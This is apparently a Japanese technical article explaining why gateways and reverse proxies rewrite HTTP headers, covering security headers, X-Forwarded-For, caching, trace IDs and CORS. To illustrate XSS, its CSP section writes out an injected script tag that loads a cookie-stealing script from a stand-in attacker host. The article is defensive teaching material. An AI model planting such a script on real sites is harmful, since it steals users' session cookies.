## はじめに

Webアプリケーションの構成を調べていると、ロードバランサーやリバースプロキシ（Azure Application Gateway など）でHTTPヘッダーを**追加・削除・書き換え**している設定を見かけることがあります。

「なぜヘッダーをわざわざ書き換えているのか？」——設計書に理由が記載されていないことも多く、疑問に感じた経験はないでしょうか。

本記事では、HTTPヘッダーを書き換える**理由のパターン**を体系的に整理します。

---

## HTTPヘッダーとは（簡単なおさらい）

HTTPヘッダーとは、クライアント（ブラウザなど）とサーバー間でやり取りされるHTTPメッセージに付随する**メタ情報**です。

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8   ← レスポンスヘッダー
X-Frame-Options: DENY                    ← レスポンスヘッダー
```

リクエスト時にブラウザが送るもの（リクエストヘッダー）と、サーバーが返すもの（レスポンスヘッダー）の2種類があります。

---

## ヘッダーを書き換える理由のパターン

大きく分けると以下の4つの目的があります。

| 目的 | 代表例 |
|------|--------|
| ① セキュリティ強化 | 攻撃の防止・情報漏洩の抑止 |
| ② クライアントへの情報伝達 | 実際のクライアントIPの転送 |
| ③ キャッシュ・パフォーマンス制御 | CDN・ブラウザキャッシュの制御 |
| ④ アプリケーション連携 | トレースID の付与など |

---

## ① セキュリティ強化（最も多い理由）

セキュリティ対策は、ヘッダーを書き換える最大の動機です。  
以下のヘッダーは、**アプリケーションコードを修正しなくても**、ゲートウェイ側で一括追加できるため、運用上もよく使われます。

### 情報隠蔽系（サーバー情報を隠す）

| ヘッダー名 | 目的 |
|-----------|------|
| `Server` の削除・書き換え | Webサーバーの種類とバージョン（例：`nginx/1.23.0`）を隠す |
| `X-Powered-By` の削除 | 使用技術（例：`PHP/8.1`）を隠す |

**なぜ隠すのか？**

通常、サーバーのレスポンスにはこのような情報が含まれています。

```
Server: nginx/1.18.0
X-Powered-By: PHP/8.0.3
```

攻撃者はこの情報を見て、「nginx 1.18.0 の脆弱性」「PHP 8.0.3 の脆弱性」を公開データベース（CVE）で検索します。バージョンが特定できれば、既知の攻撃手法をそのまま試すことができます。

ヘッダーを削除・書き換えすると、攻撃者は使用技術のバージョンを特定できなくなり、的を絞った攻撃が難しくなります。

```
Server: -          ← 削除または無害な値に書き換え
（X-Powered-By ヘッダー自体が存在しない）
```

### クリックジャッキング対策

```
X-Frame-Options: DENY
```

または

```
Content-Security-Policy: frame-ancestors 'none'
```

**クリックジャッキング**とは、悪意のあるサイトが `<iframe>` で正規サイトを埋め込み、ユーザーに気づかせずに操作させる攻撃です。  
このヘッダーを設定することで、**ページが iframe に埋め込まれることを禁止**できます。

#### 「正規サイトを埋め込んだら危ない」のはなぜ？

ポイントは、`<iframe>` を**透明にして**正規サイトのボタンの上に重ねられるからです。

攻撃者は次のような仕掛けをします。

```
【攻撃者のページ（ユーザーに見えているもの）】

┌───────────────────────────┐
│  🎁 無料プレゼントをGETする！  │
│                           │
│  ┌─────────────────────┐  │
│  │   クリックしてね！   │  ← ユーザーが見えているボタン
│  └─────────────────────┘  │
└───────────────────────────┘

【実際の重なり（ユーザーには見えない）】

┌───────────────────────────┐
│  🎁 無料プレゼントをGETする！  │
│                           │
│  ┌─────────────────────┐  │ ← 透明な iframe（正規銀行サイト）
│  │   送金実行ボタン     │  │   が重なっている
│  └─────────────────────┘  │
└───────────────────────────┘
```

ユーザーは「無料プレゼントのボタン」をクリックしたつもりが、実際には**その裏に重なっている正規銀行サイトの「送金実行」ボタン**をクリックしていたことになります。

#### 「正規サイトに飛ばないのか？」について

`<iframe>` に埋め込まれた場合、正規サイトのページは**攻撃者のページの中に表示されたまま**で、新しいタブやウィンドウには飛びません。ユーザーからは見えていないので、何も起きていないように感じます。

また、ユーザーがすでに正規サイトにログイン済みであれば、その**ログイン状態（Cookie）が iframe 内にも引き継がれます**。つまり、送金ボタンを押すと「認証済みのユーザーが操作した」として処理が実行されてしまいます。

#### 攻撃の流れ（具体例）

1. ユーザーは普段からネットバンキングにログインしている
2. 攻撃者のメールやSNSのリンクから「無料プレゼント」ページを開く
3. そのページには透明な iframe でネットバンキングが埋め込まれている
4. ユーザーが「クリックしてね！」ボタンを押す
5. 実際には銀行の「送金実行」ボタンを押したことになり、送金が完了する
6. ユーザーは正規サイトに飛んでいないため何も気づかない

#### `X-Frame-Options: DENY` で防げる理由

正規サイト側がこのヘッダーを返すと、ブラウザは「このページは iframe に表示してはいけない」と判断し、**iframe 内での読み込み自体をブロック**します。攻撃者がどんなページを作っても、正規サイトを透明な iframe として重ねることができなくなります。

### MIMEタイプスニッフィング対策

```
X-Content-Type-Options: nosniff
```

ブラウザは本来 `Content-Type` ヘッダーを見てファイルの種類を判断しますが、古いブラウザはファイルの中身を見て勝手に種類を判断（スニッフィング）することがあります。  
このヘッダーで「スニッフィングしないで」と指示できます。

#### 攻撃の流れ（具体例）

ユーザーが画像をアップロードできる掲示板・SNS を想定します。

1. 攻撃者が「画像に見せかけた JavaScript ファイル」を作成する
   - ファイルの拡張子は `.jpg`
   - 中身は `<script>悪意のある処理</script>` が含まれるテキスト
2. 攻撃者がそのファイルをサイトにアップロードする
3. サーバーは拡張子を見て `Content-Type: image/jpeg` として返す
4. **スニッフィングが有効なブラウザ**は「ファイルの中身を見たら JavaScript だ」と判断し、画像としてではなくスクリプトとして実行する
5. 攻撃者のスクリプトが他のユーザーのブラウザで実行され、Cookie やパスワードが盗まれる

#### `X-Content-Type-Options: nosniff` で防げる理由

このヘッダーが返ると、ブラウザは「ファイルの中身に関わらず、サーバーが指定した `Content-Type` 通りに処理する」というルールを守ります。  
`Content-Type: image/jpeg` なら画像として扱い、中身が JavaScript でもスクリプトとして実行しません。

### HSTS（HTTPS 強制）

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

「このサイトには今後1年間（31536000秒）は必ず HTTPS でアクセスしてください」とブラウザに伝えます。  
HTTP でアクセスしようとしても、ブラウザ側で自動的に HTTPS にリダイレクトするようになります。

#### なぜ HTTP が危ないのか？（中間者攻撃）

HTTP は通信内容が**暗号化されていない**ため、カフェや空港などのフリー Wi-Fi では通信を盗み見られる可能性があります。

```
【HTTP のリスク】

ユーザー ─── HTTP（平文）───→ 【攻撃者が通信を傍受】 ───→ サーバー
                               ↑
                      ID やパスワードが丸見え
```

#### HSTS がない場合の問題

HTTPS に対応しているサイトでも、最初のアクセスが HTTP だと攻撃の余地が生まれます。

```
【HSTS なし】
1. ユーザーが http://bank.example.com にアクセス（HTTP）
2. サーバーが「https:// に来てください」とリダイレクト
3. 攻撃者はステップ 1〜2 の間に割り込める
   → 偽サイトを返すことができる
```

#### HSTS がある場合

一度 HTTPS でアクセスすると、ブラウザが「次回から自分で HTTPS に変換する」と記憶します。

```
【HSTS あり】
1. ユーザーが http://bank.example.com と入力
2. ブラウザが「このサイトは HSTS 対象」と知っているので
   サーバーに送る前に自動で https:// に変換
3. 最初から暗号化された通信で接続される
   → 攻撃者が割り込む隙がなくなる
```

### コンテンツセキュリティポリシー（CSP）

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.example.com
```

「このページで読み込んでいいリソース（スクリプト・画像など）はここだけ」というルールをブラウザに伝えます。  
XSS（クロスサイトスクリプティング）攻撃で悪意のあるスクリプトが挿入されても、外部サイトのスクリプト実行をブロックできます。

#### XSS（クロスサイトスクリプティング）とは？

コメント欄や検索ボックスなど、ユーザーの入力をページに表示する機能を悪用した攻撃です。

#### 攻撃の流れ（具体例）

1. 攻撃者がある掲示板サイトのコメント欄に次の内容を投稿する
   ```html
   <script src="https://evil.example.com/steal.js"></script>
   ```
2. サイトのバリデーションが甘く、そのままページに表示されてしまう
3. 別のユーザーがそのページを開く
4. ブラウザが `<script>` タグを見つけ、外部スクリプトを読み込んで実行する
5. `steal.js` がそのユーザーの Cookie を盗み、攻撃者のサーバーへ送信する

#### CSP で防げる理由

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.example.com
```

このヘッダーがあると、ブラウザは **`https://evil.example.com` からのスクリプト読み込みを拒否**します。  
たとえスクリプトタグがページに混入していても、許可リスト外のドメインからは実行されません。

```
攻撃者の <script src="evil.example.com/..."> を検出
→ ブラウザが「許可されていないドメインのスクリプト」としてブロック
→ steal.js は実行されず被害なし
```

### リファラー情報の制御

```
Referrer-Policy: strict-origin-when-cross-origin
```

ユーザーがリンクをクリックして別サイトへ移動した際、遷移元の URL（リファラー）が送信されます。  
URL にセッション情報や個人情報が含まれている場合、外部サイトへ漏洩するリスクがあります。このヘッダーで送信範囲を制御できます。

#### 具体的な漏洩のイメージ

EC サイトで商品を購入した後のサンクスページを想定します。

```
【サンクスページの URL】
https://shop.example.com/order/complete?order_id=789&user_token=abc123xyz
```

このページに外部サービスのバナー広告が貼られていた場合、広告サービスへのリクエストに `Referer` ヘッダーが自動で付与されます。

```
Referer: https://shop.example.com/order/complete?order_id=789&user_token=abc123xyz
```

`user_token` のような認証トークンが広告会社のサーバーへ送られてしまいます。

#### Referrer-Policy の設定値による違い

| 設定値 | 外部サイトへ送られる Referer |
|--------|-----------------------------|
| `no-referrer` | 何も送らない |
| `origin` | `https://shop.example.com` のみ（パス以降なし）|
| `strict-origin-when-cross-origin` | 外部サイトへは `https://shop.example.com` のみ（推奨）|
| 未設定（デフォルト） | URL 全体が送られる可能性がある |

`strict-origin-when-cross-origin` を設定すると、外部サイトへは**ドメイン名だけ**が送られ、パスやパラメーター（トークンなど）は漏れません。

## ② クライアントへの情報伝達（リバースプロキシ特有の理由）

Application Gateway のようなリバースプロキシが間に入ると、バックエンドサーバーから見た「リクエスト送信元」がプロキシのIPアドレスになってしまいます。

```
【通常】  クライアント(1.2.3.4)  →  バックエンドサーバー
【プロキシあり】 クライアント(1.2.3.4) → プロキシ(10.0.0.1) → バックエンドサーバー
                                          ↑ここのIPしか見えない
```

この問題を解決するためにヘッダーが使われます。

| ヘッダー名 | 目的 |
|-----------|------|
| `X-Forwarded-For` | 実際のクライアントIPアドレスを伝える |
| `X-Forwarded-Proto` | クライアントが使ったプロトコル（http/https）を伝える |
| `X-Real-IP` | 同様にクライアントIPを伝える（nginx でよく使われる） |

アクセスログへの記録、地域制限、不正アクセス検知などに活用されます。

#### なぜ正確な IP が必要か（具体例）

プロキシの IP しか記録されないと、「どのユーザーがいつアクセスしたか」が追跡できなくなります。また、不正アクセス対策として「同じ IP から短時間に大量アクセスが来たらブロックする」という処理を組んでいても、全ユーザーがプロキシの IP に見えてしまうため、正常なユーザーまでブロックしてしまいます。

```
【X-Forwarded-For がない場合】
バックエンドのログ: 10.0.0.1（プロキシのIP）からアクセス × 1000件
→ 全員同じ IP に見える。不正アクセスの検知ができない。

【X-Forwarded-For がある場合】
バックエンドのログ: X-Forwarded-For: 1.2.3.4 からアクセス × 998件
                    X-Forwarded-For: 5.6.7.8 からアクセス × 2件
→ 特定の IP から異常なアクセスを検知し、その IP だけブロックできる
```

## ③ キャッシュ・パフォーマンス制御

CDN やブラウザのキャッシュ動作を細かく制御するためにヘッダーを書き換えることがあります。

```
Cache-Control: no-store, no-cache
```

個人情報を含むページはキャッシュに保存されてはいけません。一方、静的ファイル（CSS・画像）は積極的にキャッシュさせてパフォーマンスを向上させます。  
アプリケーションのデフォルト設定では適切な値になっていない場合、ゲートウェイ側で上書きします。

#### キャッシュが危険なケース（具体例）

ユーザーのマイページ（氏名・住所・購入履歴が表示されるページ）がキャッシュされてしまったとします。

```
【問題のある流れ】

1. ユーザーAが図書館やネットカフェの共用PCでマイページを開く
2. ブラウザがページをキャッシュとして保存する
3. ユーザーAがログアウトしてPCを離れる
4. ユーザーBが同じPCで同じURLを開く
5. キャッシュからユーザーAの個人情報が表示されてしまう
```

CDN（コンテンツ配信ネットワーク）を使っている場合はさらに広い範囲でキャッシュされるため、影響が大きくなります。

#### Cache-Control の値による違い

| 値 | 意味 | 用途 |
|----|------|------|
| `no-store` | いかなるキャッシュも禁止 | 個人情報・マイページ |
| `no-cache` | キャッシュはするが毎回サーバーに確認してから使う | 更新頻度が高いページ |
| `max-age=3600` | 3600秒（1時間）はキャッシュを使い続ける | CSS・画像などの静的ファイル |

## ④ アプリケーション連携・運用目的

### トレースID・相関ID の付与

```
X-Request-ID: abc123-def456-...
X-Correlation-ID: xyz789-...
```

マイクロサービス構成など複数のサービスをまたぐリクエストでは、ログの突き合わせが困難です。  
ゲートウェイでリクエストごとに一意のIDを付与することで、**複数サービスのログを1本のリクエストに紐づけて追跡**できます。

#### トレースIDがないと何が困るのか？

EC サイトで「注文確定」ボタンを押すと、裏では複数のサービスが連携して動きます。

```
注文サービス → 在庫サービス → 決済サービス → メール送信サービス
```

エラーが発生したとき、各サービスのログはバラバラに記録されているため、どれが同じリクエストのものかわかりません。

```
【トレースIDなし】
注文サービスのログ:   [ERROR] 注文処理失敗
在庫サービスのログ:   [INFO]  在庫確認OK
決済サービスのログ:   [ERROR] タイムアウト
メールサービスのログ: [INFO]  送信完了

→ どのエラーが同じリクエストのものか判断できない
```

#### トレースIDがある場合

ゲートウェイがリクエストに `X-Request-ID: req-abc123` を付けて転送すると、全サービスがそのIDをログに記録します。

```
【トレースIDあり】
注文サービスのログ:   [req-abc123] [ERROR] 注文処理失敗
在庫サービスのログ:   [req-abc123] [INFO]  在庫確認OK
決済サービスのログ:   [req-abc123] [ERROR] タイムアウト
メールサービスのログ: [req-abc123] [INFO]  送信完了

→ req-abc123 で絞り込めば、1つの注文の全ログがすぐ集まる
```

障害発生時の調査時間が大幅に短縮されます。

---

### バックエンドへのルーティング情報の付与

```
X-Backend-Server: backend-01
```

どのバックエンドが処理したかを示すカスタムヘッダーを追加することで、障害調査や負荷確認に役立てることがあります。

#### なぜ複数のバックエンドが存在するのか？

Webアプリケーションはトラフィックの増加や冗長化のために、同じアプリケーションを複数台のサーバーで動かすことがあります。ゲートウェイ（ロードバランサー）がリクエストを各サーバーに振り分けます。

```
                          ┌─ backend-01
ユーザー → Application Gateway ─┤
                          └─ backend-02
```

#### 具体的な障害調査のシナリオ

「ユーザーから『たまにエラーが発生する』という報告を受けた」という状況を想定します。

**ヘッダーがない場合：**

```
ユーザーA のログ: [ERROR] 決済処理失敗
ユーザーB のログ: [INFO]  正常完了
ユーザーC のログ: [ERROR] 決済処理失敗

→ エラーが「たまに」起きるが原因不明。
  backend-01 と backend-02 どちらが原因か特定できない。
```

**ヘッダーがある場合：**

```
ユーザーA のログ: [X-Backend-Server: backend-02] [ERROR] 決済処理失敗
ユーザーB のログ: [X-Backend-Server: backend-01] [INFO]  正常完了
ユーザーC のログ: [X-Backend-Server: backend-02] [ERROR] 決済処理失敗

→ エラーはすべて backend-02 で発生していることが判明。
  backend-02 のみ調査・再起動すればよいと判断できる。
```

このように、障害の原因を特定のサーバーに絞り込め、調査範囲を大幅に狭められます。

---

### CORS（クロスオリジンリソース共有）の制御

```
Access-Control-Allow-Origin: https://allowed.example.com
```

異なるドメイン間でAPIを呼び出す際に必要なヘッダーです。  
バックエンドアプリにCORSの設定を持たせる代わりに、ゲートウェイで一元管理するケースがあります。

#### そもそもなぜブラウザはクロスオリジンの通信をブロックするのか？

ブラウザには「**同一オリジンポリシー（Same-Origin Policy）**」というセキュリティルールがあります。オリジンとは `プロトコル + ドメイン + ポート番号` の組み合わせで、これが一致しない通信は**デフォルトでブロック**されます。

| URL | 比較対象（https://app.example.com） | 同一オリジン？ |
|-----|-----------------------------------|--------------|
| `https://app.example.com/page` | 同じ | ✅ OK |
| `https://api.example.com` | ドメインが違う | ❌ ブロック |
| `http://app.example.com` | プロトコルが違う | ❌ ブロック |
| `https://app.example.com:8080` | ポートが違う | ❌ ブロック |

このルールがある理由は、悪意のあるサイトが勝手に別サービスのAPIを呼び出してデータを盗むことを防ぐためです。

#### 具体的な問題のシナリオ

フロントエンドとAPIサーバーが別ドメインに分かれているよくある構成を想定します。

```
フロントエンド: https://app.example.com
APIサーバー:   https://api.example.com
```

**CORSヘッダーがない場合：**

```
1. ユーザーが https://app.example.com を開く
2. フロントエンドのJavaScriptが https://api.example.com/data を呼び出す
3. APIサーバーはレスポンスを返す
4. ブラウザが「オリジンが違う！許可されていない！」と判断してブロック
5. JavaScriptにはデータが渡らず、画面にエラーが表示される
   （ブラウザのコンソールに CORS エラーが出る）
```

**CORSヘッダーがある場合：**

```
1. ユーザーが https://app.example.com を開く
2. フロントエンドのJavaScriptが https://api.example.com/data を呼び出す
3. APIサーバー（またはゲートウェイ）が次のヘッダーを返す

   Access-Control-Allow-Origin: https://app.example.com

4. ブラウザが「APIサーバーが許可している」と判断してデータを渡す
5. 正常にデータが取得でき、画面に表示される
```

#### ゲートウェイで管理するメリット

複数のバックエンドAPIが存在する場合、それぞれのアプリに CORS 設定を実装・管理するのは手間がかかります。  
ゲートウェイ側でまとめて設定すれば、「どのフロントエンドドメインを許可するか」を**1か所で一元管理**できます。

## まとめ

HTTPヘッダーを書き換える主な理由を整理すると以下のとおりです。

- **セキュリティ強化が最も多い理由**
  - サーバー情報の隠蔽（`Server`, `X-Powered-By` の削除）
  - 各種攻撃対策ヘッダーの追加（`X-Frame-Options`, `X-Content-Type-Options`, `CSP`, `HSTS` など）
- **リバースプロキシ特有の問題への対処**
  - クライアントの実IPをバックエンドへ伝える（`X-Forwarded-For` など）
- **キャッシュ・パフォーマンスの最適化**
  - `Cache-Control` の上書き
- **運用・監視・連携のため**
  - トレースID の付与、CORS の一元管理など

Application Gateway のような場所でヘッダーを書き換えるのは、「**アプリケーションを修正せずに一括で適用できる**」という運用上のメリットもあります。1か所に設定すれば、複数のバックエンドにまとめて適用できるためです。
